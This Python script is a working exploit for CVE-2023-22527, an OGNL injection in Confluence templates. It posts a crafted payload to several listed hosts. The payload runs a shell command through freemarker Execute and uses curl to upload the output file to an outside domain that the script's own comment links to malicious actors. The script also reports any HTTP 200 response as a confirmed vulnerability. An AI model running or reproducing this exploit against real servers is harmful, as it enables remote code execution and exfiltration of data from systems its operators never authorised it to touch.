import requests
from urllib.parse import urlencode
from colorama import Fore, Style

def validate_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] URL validation error: {e}{Style.RESET_ALL}")
        return False

def scan_for_vulnerability(target_url, poc):
    url = target_url + "/template/aui/text-inline.vm"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"label": "aaa'%2B#request.get('.KEY_velocity.struts2.context').internalGet('ognl').findValue(#parameters.poc[0],{})%2b'&poc=" + poc}
    data = urlencode(data)

    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        print(f"{Fore.GREEN}[*] Server {target_url} is vulnerable to CVE-2023-22527!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] It's possible to execute the following command using the exploit: {poc}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[*] Server {target_url} is not vulnerable to CVE-2023-22527.{Style.RESET_ALL}")

target_urls = [
    "http://192.168.1.1",
    "http://192.168.1.2",
    "http://example.com",
]

for url in target_urls:
    if validate_url(url):
        scan_for_vulnerability(url, "@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd-Ret',(new freemarker.template.utility.Execute()).exec({'pwd > 778.txt && curl -F \"file=@./778.txt\" http://www.p0b1ic[.]com/1.php'}))") # p0b1ic[.]com is a domain name used by malicious actors engaged in malicious activities.
